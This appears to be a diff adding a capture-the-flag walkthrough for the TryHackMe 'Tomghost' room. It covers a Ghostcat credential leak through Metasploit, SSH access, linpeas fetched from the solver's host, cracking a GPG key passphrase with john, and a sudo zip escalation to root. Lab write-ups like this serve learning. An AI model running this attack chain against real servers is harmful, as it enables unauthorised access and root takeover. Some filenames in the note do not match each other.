@@ -1,0 +1,55 @@
+Tomghost
+.- *nmap -T4 -A 10.201.77.68*
+	- port 22 - ssh
+	- port 53 - tcpwrapped
+	- port 8009 - apache jserv
+	- port 8080 - apache tomcat 9.0.30
+- google: "apache tomcat 9.0.30 exploit"
+	- https://www.exploit-db.com/exploits/49039
+	- it is in exploit
+- *msfconsole*
+- *use auxiliary/admin/http/tomcat_ghostcat*
+	- port was default
+	- *set rhosts 10.201.28.61*
+- *run*
+- Outputs credentials
+	- skyfuck : 8730281lkjlkjdqlksalks
+![[Pasted image 20250907152605.png]]
+- *ssh skyfuck@10.201.28.61* --> low-level user access achieved
+	- Password: *8730281lkjlkjdqlksalks*
+- *cat ../home/merlin/user.txt* --> low-level user flag found
+- *cd ../tmp*
+- *wget http://10.23.172.46:8081/linpeas.sh*
+- *chmod +x linpeas.sh*
+- *./linpeas.sh*
+![[Pasted image 20250907153346.png]]
+- we note a "credentials.gpg" file and "tryhackme.asc" file 
+	- *scp skyfuck@10.201.68.150:/home/skyfuck/credential.pgp credential.pgp* to get the file
+- we note another non-root user present on the system "merlin"
+	- scp skyfuck@10.201.68.150:/home/skyfuck/tryhackme.asc tryhackme.asc
+- these two files are all we need to "crack" the asymmetric encryption used:
+- *gpg2john tryhackme.asc > gpg.hash*
+- *john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash*
+	- gives us "alexandru" --> passphrase protecting the private key
+	- "tryhackme" the user ID field in the gpg key
+![[Pasted image 20250907185700.png]]
+- we then add that key to our gpg using the passphrase:
+- *gpg --import tryhackme.asc*
+![[Pasted image 20250907185712.png]]
+- we are then able to decrypt the "credentials.gpg" file:
+- *gpg --output cracked.txt --decrypt credential.pgp*
+![[Pasted image 20250907190327.png]]
+- *cat credentials.txt*
+	- merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j 
+- *ssh merlin@10.201.68.150*
+	- password:
+- *sudo -l*
+	User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+- GTFObins: zip - SUDO
+	- *TF=$(mktemp -u)*
+	- *merlin@ubuntu:/home$ sudo zip $TF /etc/hosts -T -TT 'sh #'*
+- *whoami*
+	- root
+- *cd ../root*
+- *cat root.txt*
